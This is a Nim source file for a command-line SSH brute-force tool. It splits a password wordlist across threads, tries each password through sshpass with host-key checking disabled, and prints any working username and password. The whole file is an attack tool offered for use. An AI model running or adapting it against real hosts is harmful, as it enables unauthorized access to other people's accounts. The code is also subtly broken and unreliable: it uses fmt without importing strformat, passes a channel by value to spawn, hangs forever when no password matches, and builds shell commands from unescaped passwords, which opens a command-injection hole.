import net
import osproc
import strutils
import threadpool
import times
import parseopt

# Configuration
type
  Config = object
    host: string
    port: int
    username: string
    wordlist: string
    threads: int
    timeout: int

# SSH connection attempt
proc try_ssh_login(host: string, port: int, username: string, password: string, timeout: int): bool =
  let cmd = fmt"sshpass -p '{password}' ssh -o ConnectTimeout={timeout} -o StrictHostKeyChecking=no -p {port} {username}@{host} 'echo SUCCESS'"
  let (output, exitCode) = execCmdEx(cmd)
  return exitCode == 0 and "SUCCESS" in output

# Worker thread for brute force
proc worker(config: Config, passwords: seq[string], channel: Channel[string]) =
  for password in passwords:
    if try_ssh_login(config.host, config.port, config.username, password, config.timeout):
      channel.send(fmt"[SUCCESS] {config.username}:{password}")
      break

# Main brute force function
proc ssh_brute_force(config: Config) =
  echo fmt"Starting SSH brute force on {config.host}:{config.port}"
  echo fmt"Target: {config.username}"
  echo fmt"Threads: {config.threads}"
  echo fmt"Timeout: {config.timeout} seconds"
  echo "----------------------------------------"

  # Load wordlist
  let wordlist = readFile(config.wordlist).splitLines()
  echo fmt"Loaded {len(wordlist)} passwords"
  
  # Split passwords among threads
  let chunkSize = len(wordlist) div config.threads
  var channels: seq[Channel[string]]
  
  # Create channel for results
  var resultChannel: Channel[string]
  resultChannel.open()
  
  # Spawn threads
  for i in 0..<config.threads:
    let startIdx = i * chunkSize
    let endIdx = if i == config.threads - 1: len(wordlist) else: (i + 1) * chunkSize
    let passwords = wordlist[startIdx..<endIdx]
    spawn worker(config, passwords, resultChannel)
  
  # Wait for results
  var found = false
  while not found:
    let result = resultChannel.recv()
    if result.startsWith("[SUCCESS]"):
      echo result
      found = true
      break
  
  if not found:
    echo "No valid credentials found"

# Parse command line arguments
proc parse_args(): Config =
  var config = Config(
    port: 22,
    threads: 4,
    timeout: 10
  )
  
  for kind, key, val in getopt():
    case kind
    of cmdLongOption, cmdShortOption:
      case key
      of "host", "h": config.host = val
      of "port", "p": config.port = parseInt(val)
      of "user", "u": config.username = val
      of "wordlist", "w": config.wordlist = val
      of "threads", "t": config.threads = parseInt(val)
      of "timeout", "T": config.timeout = parseInt(val)
      of "help": 
        echo "Usage: ssh_brute_nim --host <host> --user <username> --wordlist <file> [options]"
        echo "Options:"
        echo "  -h, --host <host>         Target host"
        echo "  -p, --port <port>         SSH port (default: 22)"
        echo "  -u, --user <username>     Username to brute force"
        echo "  -w, --wordlist <file>     Password wordlist file"
        echo "  -t, --threads <num>       Number of threads (default: 4)"
        echo "  -T, --timeout <sec>       Connection timeout (default: 10)"
        quit(0)
    else: discard
  
  if config.host.len == 0 or config.username.len == 0 or config.wordlist.len == 0:
    echo "Error: Missing required arguments"
    echo "Use --help for usage information"
    quit(1)
  
  return config

# Main
when isMainModule:
  let config = parse_args()
  ssh_brute_force(config)
